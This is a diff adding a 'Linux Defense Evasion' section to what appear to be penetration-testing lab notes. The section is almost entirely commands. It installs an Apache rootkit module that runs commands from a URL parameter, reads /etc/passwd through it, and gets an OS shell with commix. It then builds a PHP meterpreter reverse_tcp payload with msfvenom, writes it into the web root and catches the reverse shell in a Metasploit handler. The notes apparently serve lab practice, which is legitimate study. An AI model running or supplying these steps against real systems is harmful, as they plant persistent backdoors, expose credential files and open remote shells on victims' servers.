@@ -158,9 +158,60 @@ $ nc -nlvp 1234 ...
 
 $ /tmp/ $ ./shell.py
  
-$ /tmp/ $ ps aux               #(Hide success!)       
+$ /tmp/ $ ps aux               #(Hide success!)   
 
-      
+
+
+### Linux Defense Evasion
+
+
+
+- On Kali (attaker VM)
+
+#(Git clone apache-rookit on the disk)
+
+$ sudo apt-get install apache2-dev
+$ /tmp/apache-rootkit $ vim mod_authg.c                    #(read or modify it)
+$ /tmp/apache-rootkit $ whatis apxs
+$ /tmp/apache-rootkit $ apxs -c -i mod_authg.c
+$ /tmp/apache-rootkit $ ls -alps /etc/apache2
+$ /tmp/apache-rootkit $ ls -al /usr/lib/apache2/modules
+$ /tmp/apache-rootkit $ vim /etc/apache2/apache2.conf        #(write LoadModule authg_module /usr/lib/apache2/modules/mod_authg.so and below <Location /authg> SetHandler authg </Location> , and save it)
+$ /tmp/apache-rootkit $ systemctl restart apache2
+
+#(Go on the wep app 10.10.10.10/authg?c=cat/etc/passwd or whoami)     #(injection success!)
+
+
+#(Technique 2 = Commix)
+
+
+$ sudo apt-get install commix -y
+$ commix -u http://10.10.10.10/authg/?c/=id   
+
+commix(os_shell) > ?
+commix(os_shell) > ls                   #(bin boot dev etc home lib ....)
+commix(os_shell) > id                   #(uid=33(www-data))
+commix(os_shell) > cat /etc/passwd
+
+$ msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1234 -e php/base64 -f raw > ~/Desktop/shell.php               #(on the file and add <?php BJIWGIUGUI48693 ?>)
+
+msf6 > use multi/handler
+msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp/
+msf6 exploit(multi/handler) > show options
+msf6 exploit(multi/handler) > set LHOST 10.10.10.10
+msf6 exploit(multi/handler) > set LPORT 1234
+msf6 exploit(multi/handler) > run
+    - Started reverse tcp handler on 10.10.10.10 ...
+    
+commix(os_shell) > commix -u http://10.10.10.10/authg/?c/=id --file-write='/home/kali/Desktop/shell.php' --file-dest='var/www/html/shell.php'
+
+$ ls -al /var/www/html/                 #(shell.php is here) 
+
+#(Go on the wep app 10.10.10.10/shell.php)     #(reverse shell success!)
+
+meterpreter > sysinfo 
+
+
 
 
 
